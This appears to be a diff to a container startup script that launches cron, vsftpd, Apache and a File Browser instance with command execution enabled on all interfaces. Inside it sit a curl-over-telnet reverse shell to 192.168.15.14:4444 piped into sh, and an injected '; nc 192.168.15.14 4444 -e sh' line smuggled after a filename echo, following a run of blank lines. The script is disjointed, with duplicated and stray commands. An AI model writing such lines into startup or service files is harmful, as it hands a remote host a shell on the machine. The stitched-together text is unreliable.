@@ -1,3 +1,49 @@
+
+cron
+
+# services
+vsftpd /etc/vsftpd/vsftpd.conf &
+
+su -s /bin/sh supernova -c "
+    $FILEBROWSER \
+        --address 0.0.0.0 \
+        --port 80 \
+        --disable-exec=false \
+        --root /home/supernova/file-browser \
+        --database $DB
+" &
+
+# Read Apache environment details & execute the web engine safely in background
+. /etc/apache2/envvars
+apache2 -D FOREGROUND &
+
+# IMPORTANT: keep container alive
+tail -f /dev/null
+
+
+/home/supernova/bin/filebrowser  --address 0.0.0.0 --port 8080 --disable-exec=false --root /home/supernova/file-browser --database /home/supernova/filebrowser.db
+
+ 
+C='curl -Ns telnet://192.168.15.14:4444'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+
+
+/bin/bash  
+bash -c "echo file renamed: \$FILE"
+
+# sh -c "echo this old filename has been changed and is now deprecated: \$FILE"
+
+
+
+
+
+
+
+
+
+
+
+
+---
 sh -c "echo this filename has been renamed: \$FILE"
 
 ; nc 192.168.15.14 4444 -e sh #
